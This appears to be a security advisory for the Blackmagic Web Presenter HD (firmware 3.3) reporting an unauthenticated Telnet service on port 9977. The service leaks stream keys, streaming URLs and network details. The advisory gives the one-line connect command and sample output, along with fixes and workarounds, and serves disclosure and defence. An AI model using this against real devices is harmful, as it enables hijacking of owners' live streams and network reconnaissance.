#  Blackmagic Web Presenter HD (Firmware 3.3) - Information Disclosure via Telnet

## Summary

**Product:** Blackmagic Web Presenter HD  
**Firmware Version:** 3.3  
**Vulnerability Type:** Information Disclosure  
**Vulnerable Endpoint:** Telnet (port 9977)

## Description

The Blackmagic Web Presenter HD firmware version 3.3 exposes sensitive information via an unauthenticated Telnet service on port `9977`. When connected, the service reveals extensive device configuration data including:

- Model, version, and unique identifiers  
- Network settings including IP, MAC, DNS  
- Current stream platform, stream key, and streaming URL  
- Audio/video configuration

This data can be used to hijack live streams or perform network reconnaissance.

## Exploit Steps

1. Connect to the device over Telnet:
   ```bash
   telnet <target-ip> 9977
   ```
2. Upon connection, detailed system information will be displayed, for example:
```yaml
STREAM SETTINGS:
Stream Key: tesp-tq5c-test-test-test
Current URL: rtmps://a.rtmps.youtube.com/live2
...
NETWORK INTERFACE 0:
MAC Address: 7c:2e:0d:a4:c5:af
Current Addresses: x.x.x.x
```

## Proof of Concept (PoC) for(CE,Information Disclosure) 
![Image](https://github.com/user-attachments/assets/a2c8f895-1296-4296-a4d5-2bd94988955f)

https://github.com/user-attachments/assets/5b02b52f-0c53-451a-80ef-4a03fa3a2027

## Affected Component(s)

    Telnet Service running on port 9977

    Device management interface (plaintext protocol)

## Attack Vector(s)

    Direct TCP access to port 9977 using Telnet

    No authentication is required to retrieve the information
    
## Impact

An unauthenticated attacker can retrieve:

    Live streaming credentials (e.g., Stream Keys)

    Streaming URLs and platform details

    Device firmware and software versions

    Internal/external network details (IP, MAC, DNS, Gateway)

    Audio/video configuration info

# This allows:

    Unauthorized hijacking of live broadcasts

    Enumeration of network environment

    Facilitation of further attacks (e.g., spoofing, MITM)

## Suggested Fixes

    Disable Telnet entirely or restrict it to administrative users via authentication.

    Replace Telnet with a secure, encrypted management protocol (e.g., SSH with key-based auth).

    Implement firewall rules to limit access to port 9977 to trusted hosts only.

    Remove or limit sensitive data from being exposed over diagnostics interfaces.

## Workarounds

    Block port 9977 using local firewall or edge network device.

    Restrict management network access using VLAN segmentation or ACLs.

    Regularly rotate stream keys and avoid hard-coding sensitive streaming credentials.

    Monitor outgoing RTMP/SRT traffic to detect unauthorized stream activity.
